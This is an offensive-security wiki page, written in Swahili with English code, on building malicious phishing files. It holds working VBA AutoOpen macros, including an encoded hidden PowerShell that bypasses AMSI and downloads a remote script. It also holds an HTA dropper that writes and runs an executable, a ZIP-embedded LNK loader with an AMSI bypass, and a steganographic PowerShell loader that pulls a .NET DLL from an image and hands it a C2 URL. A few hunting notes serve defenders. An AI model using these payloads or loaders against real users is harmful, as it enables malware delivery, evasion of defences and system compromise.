# Phishing Faili & Nyaraka

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uhakiki wa data ya faili kabla ya kufungua faili. Uhakiki wa data unafanywa kwa njia ya utambuzi wa muundo wa data, kulingana na standard ya OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kawaida, faili za Word zenye macros hutumia ugani `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha ugani na bado kuhifadhi uwezo wao wa utekelezaji wa macro.\
Kwa mfano, faili ya RTF haijahusishwa na macros, kwa muundo wake, lakini faili ya DOCM iliyobadilishwa jina hadi RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa utekelezaji wa macro.\
Vitu sawa vya ndani na mifumo vinatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni ugani gani utakayotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Kupakia Picha za Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros ili kuendesha code yoyote kutoka kwenye hati.

#### Autoload functions

Kadri zinavyokuwa za kawaida zaidi, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mkono

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Ugani la Doc

Ukimaliza, chagua kidirisha cha **Save as type**, badilisha format kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu huwezi kuhifadhi macros ndani ya **`.docx`** na kuna aibu inayohusiana na ugani unaoruhusu macro **`.docm`** (mfano: ikoni ya thumbnail ina alama kubwa ya `!` na baadhi ya gateway za wavuti/baruapepe zinaweza kuzuzuia kabisa). Kwa hivyo, **ugani wa kale `.doc` ndicho suluhisho bora**.

#### Jenereta za Macros Zenye Madhara

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows ambayo **inayounganisha HTML na lugha za scripting (kama VBScript na JScript)**. Inaunda interface ya mtumiaji na inatekelezwa kama programu "fully trusted", bila vizingiti vya mfano wa usalama wa browser.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida imewekwa pamoja na **Internet Explorer**, na hivyo **`mshta` inategemea IE**. Kwa hivyo, iwapo IE imeondolewa, HTA hazitaweza kuendeshwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kuamsha NTLM Authentication

Kuna njia kadhaa za **force NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atazitumia (hata HTTP MitM?). Au kumtumia mwathiriwa **anwani ya faili** ambazo zita**trigger** **authentication** hata kwa **kufungua folda.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication bali pia **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (mnyororo isiyo na faili)

Mikakati yenye ufanisi mkubwa hutoa ZIP ambayo inajumuisha nyaraka mbili za kuudanganya za halali (PDF/DOCX) na .lnk yenye maovu. Njia ya kuficha ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama maalum, na .lnk inachonga na kuiendesha kikamilifu kwenye memory.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tafuta ZIP asilia katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na directory mzazi wa current working directory.
2) Soma bytes za ZIP na utafute marker iliyowekwa (mfano, xFIQCV). Kila kitu baada ya marker ni PowerShell payload iliyowekwa.
3) Nakili ZIP kwenda %ProgramData%, ichule huko, na ufungue .docx ya udanganyifu ili ionekane halali.
4) Bypass AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate hatua inayofuata (mfano, ondoa wote # characters) na uitekeleze kwenye memory.

Mfano wa skeleton ya PowerShell ya kuchonga na kuendesha hatua iliyowekwa:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Vidokezo
- Uwasilishaji mara nyingi hutumia vibaya subdomains zenye sifa nzuri za PaaS (mf., *.herokuapp.com) na inaweza kuzuia payloads (kuwasilisha ZIPs zisizo hatari kulingana na IP/UA).
- Hatua inayofuata mara nyingi decrypts base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza disk artifacts.

Persistence iliyotumika katika mnyororo uleule
- COM TypeLib hijacking of the Microsoft Web Browser control ili IE/Explorer au app yoyote inayoi-embed irejeshe payload moja kwa moja. Angalia maelezo na amri tayari-kutumiwa hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zenye mnyororo wa alama wa ASCII (mf., xFIQCV) ulioambatanishwa kwenye data ya archive.
- .lnk inayoorodhesha folda za mzazi/mtumiaji kutafuta ZIP na kufungua dokumenti ya udanganyifu.
- Ubadilishaji wa AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads za biashara zinazodumu kwa muda mrefu zikimalizika kwa links zilizohifadhiwa chini ya domains za PaaS zinazotegemewa.

## Steganography-delimited payloads in images (PowerShell stager)

Chains za loader za hivi karibuni hutoa JavaScript/VBS iliyofichwa ambayo ina-decoden na kuendesha Base64 PowerShell stager. Stager hiyo hupakua picha (mara nyingi GIF) inayobeba .NET DLL iliyokodishwa kwa Base64 iliyofichwa kama plain text kati ya unique start/end markers. Script inatafuta delimiters hizi (mifano iliyoshuhudiwa: «<<sudo_png>> … <<sudo_odt>>>»), inatoa maandishi yaliyo kati, ina-Base64-decode hadi bytes, inapakia assembly in-memory na kuitisha entry method inayojulikana ikipeleka C2 URL.

Mtiririko
- Stage 1: Archived JS/VBS dropper → ina-decode embedded Base64 → ina-launch PowerShell stager na -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → hupakua image, inakata Base64 iliyotengwa na markers, inapakia .NET DLL in-memory na inaita method yake (mf., VAI) ikipeleka C2 URL na options.
- Stage 3: Loader inapata payload ya mwisho na kwa kawaida inaweza ku-inject kupitia process hollowing ndani ya binary inayotegemewa (kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchonga DLL kutoka kwa picha na kuitisha method ya .NET in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Vidokezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Markers zinatofautiana kati ya campaigns.
- AMSI/ETW bypass na string deobfuscation mara nyingi zinatumika kabla ya kuingiza assembly.
- Upelelezi: skana picha zilizopakuliwa kutafuta delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja kuifungua Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Awamu ya mwanzo inayojirudia ni `.js` ndogo au `.vbs` iliyo heavily‑obfuscated iliyowekwa ndani ya archive. Kusudi lake pekee ni kufungua kamba ya Base64 iliyojazwa ndani na kuanzisha PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuatayo kupitia HTTPS.

Mantiki ya muundo (muhtasari):
- Soma yaliyomo kwenye faili yake mwenyewe
- Tafuta blob ya Base64 kati ya mashamba ya takataka
- Decode hadi PowerShell ya ASCII
- Tekeleza kwa `wscript.exe`/`cscript.exe` ikimuita `powershell.exe`

Vidokezo vya upelelezi
- Viambatisho vya JS/VBS vilivyohifadhiwa vikiendesha `powershell.exe` na `-enc`/`FromBase64String` kwenye command line.
- `wscript.exe` ikianzisha `powershell.exe -nop -w hidden` kutoka kwenye user temp paths.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
